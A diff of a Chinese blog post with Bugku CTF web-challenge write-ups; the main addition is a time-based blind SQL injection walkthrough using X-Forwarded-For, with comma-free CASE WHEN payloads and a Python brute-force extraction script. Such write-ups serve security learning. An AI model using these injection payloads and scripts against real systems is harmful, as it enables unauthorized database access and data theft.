@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6.5k 字
+      6.9k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      98
+      105
        分钟
     </span>
   
@@ -254,7 +254,7 @@
 
 <h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
 <p>抓包看了看，惊喜的发现了flag字段</p>
-<p><img src="/2020/09/10/bugku1/%E9%80%9F%E5%BA%A61.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" srcset="/img/loading.gif" alt></p>
 <p>一段base64 解码后为<code>NDQyMDIy</code></p>
 <p>提交发现并不对。。。看来另有玄机</p>
 <p>多go几次后发现了flag值一直在变，并且有一段提示</p>
@@ -273,12 +273,12 @@ flag = base64.b64decode(mid.split(<span class="hljs-string">':'</span>)[<span cl
 data=&#123;<span class="hljs-string">'margin'</span>:flag&#125;
 <span class="hljs-keyword">print</span> (r.post(url,data).text)<span class="hljs-comment">#post方法传上去</span></code></pre></div>
 
-<p><img src="/2020/09/10/bugku1/headers.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" srcset="/img/loading.gif" alt="headers.png"></p>
 <h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
 <p>line=2&amp;filename=a2V5cy50eHQ=</p>
 <p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
 <p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
-<p><img src="/2020/09/10/bugku1/cookie1.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" srcset="/img/loading.gif" alt="cookie1.png"></p>
 <p>改变line的值可以一行一行的查看源码，可以使用脚本</p>
 <div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 url1 = <span class="hljs-string">"http://123.206.87.240:8002/web11/index.php?line="</span>
@@ -330,19 +330,17 @@ $fa = file($file);
 
 <p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
 <p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
-<p><img src="/2020/09/10/bugku1/cookie2.png" srcset="/img/loading.gif" alt="bp"></p>
-<p><img src="/2020/09/10/bugku1/cookie3.png" srcset="/img/loading.gif" alt="hackbar"></p>
+<p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" srcset="/img/loading.gif" alt="bp"></p>
 <h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
 <p><code>&lt;!--1p.html--&gt;</code>     </p>
 <p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
-<p><img src="/2020/09/10/bugku1/never2.png" srcset="/img/loading.gif" alt></p>
 <div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div>
 
 <p>base64解码后为url编码</p>
 <div class="hljs"><pre><code class="hljs angelscript">%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>%<span class="hljs-number">21</span>%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>header%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>Location%<span class="hljs-number">3</span>A%<span class="hljs-number">20</span>hello.php%<span class="hljs-number">3</span>Fid%<span class="hljs-number">3</span>D1%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>exit%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>id%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>a%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>a%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>b%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_GET%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>b%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>stripos%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27.</span>%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>echo%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">20</span>no%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span><span class="hljs-keyword">return</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">24</span>data%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-symbol">20@</span>file_get_contents%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>a%<span class="hljs-number">2</span>C%<span class="hljs-number">27</span>r%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aif%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>data%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>bugku%<span class="hljs-number">20</span><span class="hljs-keyword">is</span>%<span class="hljs-number">20</span>a%<span class="hljs-number">20</span>nice%<span class="hljs-number">20</span>plateform%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>id%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D0%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>strlen%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3E5</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>eregi%<span class="hljs-number">28</span>%<span class="hljs-number">22111</span>%<span class="hljs-number">22.</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">221114</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span><span class="hljs-keyword">and</span>%<span class="hljs-number">20</span>substr%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>b%<span class="hljs-number">2</span>C0%<span class="hljs-number">2</span>C1%<span class="hljs-number">29</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>D4%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>require%<span class="hljs-number">28</span>%<span class="hljs-number">22f</span>4l2a3g.txt%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>Aelse%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">09</span>print%<span class="hljs-number">20</span>%<span class="hljs-number">22</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>never%<span class="hljs-number">20</span>give%<span class="hljs-number">20</span>up%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">21</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">7</span>D%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">0</span>A%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E</code></pre></div>
 
 <p>url解码为源码</p>
-<p><img src="/2020/09/10/bugku1/never1.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" srcset="/img/loading.gif" alt></p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 f(!$_GET[<span class="hljs-string">'id'</span>])
 &#123;
@@ -370,7 +368,7 @@ $data = @file_get_contents($a,<span class="hljs-string">'r'</span>);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>果然藏在f4l2a3g.txt</p>
-<p><img src="/2020/09/10/bugku1/never.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" srcset="/img/loading.gif" alt></p>
 <h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
 <p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
 <h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
@@ -398,7 +396,6 @@ $IM= preg_match(<span class="hljs-string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*
 <p>因此可以写出符合要求的字符穿</p>
 <div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">keyakey22222key:</span><span class="hljs-meta-keyword">/a/</span>aaakeyb!</code></pre></div>
 
-<p><img src="/2020/09/10/bugku1/%E6%AD%A3%E5%88%99.png" srcset="/img/loading.gif" alt></p>
 <h2 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h2><p>题目网址打不开</p>
 <h2 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h2><p>题目网址打不开</p>
 <h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
@@ -437,9 +434,9 @@ s214587387a
 
 
 <h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
-<p>可以使用google浏览器的插件<img src="/2020/09/10/bugku1/xff.png" srcset="/img/loading.gif" alt></p>
-<p><img src="/2020/09/10/bugku1/localhost.png" srcset="/img/loading.gif" alt></p>
-<p><img src="/2020/09/10/bugku1/lc.png" srcset="/img/loading.gif" alt></p>
+<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" srcset="/img/loading.gif" alt></p>
 <h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 highlight_file(<span class="hljs-string">'flag.php'</span>);
@@ -474,7 +471,7 @@ passwd[]=<span class="hljs-number">2</span>
 GET: id=%<span class="hljs-number">6</span>D%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>E&amp;uname[]=<span class="hljs-number">1</span>
 POST:passwd[]=<span class="hljs-number">2</span></code></pre></div>
 
-<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt="raoguo.png"></p>
+<p><img src="https://i.loli.net/2020/11/23/MPLxeWwG2BIYHbf.png" srcset="/img/loading.gif" alt></p>
 <h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 extract($_GET);
 <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($ac))
@@ -571,16 +568,59 @@ $sql=<span class="hljs-string">"insert into client_ip (ip) values ('$ip')"</span
 mysql_query($sql);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
+<p>网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。</p>
+<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注</p>
+<div class="hljs"><pre><code class="hljs arcade"><span class="hljs-symbol">$ip</span>_arr = explode(<span class="hljs-string">','</span>, <span class="hljs-symbol">$ip</span>);   <span class="hljs-comment">//过滤了,</span></code></pre></div>
 
-
-<p>抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，并且没有回显所以要使用基于时间的盲注</p>
 <p>代替if的注入语句如下</p>
-<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> xxx <span class="hljs-keyword">then</span> xxx <span class="hljs-keyword">else</span> xxx <span class="hljs-keyword">end</span>;</code></pre></div>
+<div class="hljs"><pre><code class="hljs angelscript">select <span class="hljs-keyword">case</span> when 语句<span class="hljs-number">1</span> then 语句<span class="hljs-number">2</span> <span class="hljs-keyword">else</span> 语句<span class="hljs-number">3</span> end;
+<span class="hljs-comment">//含义很好理解，就是当语句1为真时，执行语句2，否则执行语句3</span></code></pre></div>
 
 <p>所以要构造的注入语句为</p>
-<div class="hljs"><pre><code class="hljs sql">11'+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span></code></pre></div>
+<div class="hljs"><pre><code class="hljs sql">11'+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
+//当数据库名的长度为<span class="hljs-number">5</span>时，则执行<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确</code></pre></div>
+
+<p>带入原语句</p>
+<div class="hljs"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">'$ip'</span>)
+<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> client_ip (ip) <span class="hljs-keyword">values</span> (<span class="hljs-string">'11'</span>+(<span class="hljs-keyword">select</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">when</span> <span class="hljs-keyword">length</span>(<span class="hljs-keyword">database</span>())=<span class="hljs-number">5</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span>))%<span class="hljs-number">23</span>
+//可以看到语句成功注入到原查询语句中，并可以正常执行</code></pre></div>
+
+<p>判断字段每一个字符的值</p>
+<p>常用的语句应该为</p>
+<div class="hljs"><pre><code class="hljs sql">1' and (case when (substr(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">'c'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-comment">#</span></code></pre></div>
+
+<p>但是因为逗号被过滤了，所以改为下面的语句</p>
+<div class="hljs"><pre><code class="hljs sql">1' and (case when (substr(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>)=<span class="hljs-string">'c'</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">end</span>) <span class="hljs-comment">#</span></code></pre></div>
 
 
+
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-comment">#sql = '127.0.0.1'+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+</span>
+
+<span class="hljs-comment">##client_ip,flag</span>
+
+<span class="hljs-comment">#sql = '127.0.0.1'+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name='flag' from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+</span>
+
+sql = <span class="hljs-string">"127.0.0.1'+(select case when substr((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;' then sleep(5) else 0 end))-- +"</span>
+url = <span class="hljs-string">'http://123.206.87.240:8002/web15/'</span>
+flag = <span class="hljs-string">''</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):
+    print(str(i))
+    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>, <span class="hljs-number">129</span>):
+        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">128</span>:
+            sys.exit(<span class="hljs-number">0</span>)
+        sqli = sql.format(i, chr(ch))
+        header = &#123;
+            <span class="hljs-string">'X-Forwarded-For'</span>: sqli
+        &#125;
+        <span class="hljs-keyword">try</span>:
+            html = requests.get(url, headers=header, timeout=<span class="hljs-number">3</span>) <span class="hljs-comment">#响应时间超过3秒则 进入except 即可猜测是正确的</span>
+        <span class="hljs-keyword">except</span>:
+            flag += chr(ch)
+            print(flag)
+            <span class="hljs-keyword">break</span></code></pre></div>
 
 
 
@@ -1141,7 +1181,7 @@ for (i = 0;i&lt;result3.length;i++)&#123;
   <div id="vcomments"></div>
   <script type="text/javascript">
     function loadValine() {
-      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
+      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
         new Valine({
           el: "#vcomments",
           app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
@@ -1155,6 +1195,9 @@ for (i = 0;i&lt;result3.length;i++)&#123;
           highlight: true,
           recordIP: false,
           serverURLs: "",
+          master: "4cd096660a71d786a2a4d9d0bb4e8996",
+          friends: "b275f0fc8103331da645a878cf60f841",
+          tagMeta: ["博主","友人","访客"],
         });
       });
     }
@@ -1408,7 +1451,43 @@ for (i = 0;i&lt;result3.length;i++)&#123;
 
 
 
-
+<div class="text-center py-1">   
+  <div>
+    <span>Copyright © 2020</span></a>
+    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
+     <span>my blog</span></a>    <br>
+  </div>
+<div>
+  <span id="timeDate">载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
+      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
+  }  //此次自定义显示内容
+  setInterval("createtime()",250);
+  </script>
+</div>
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 </html>
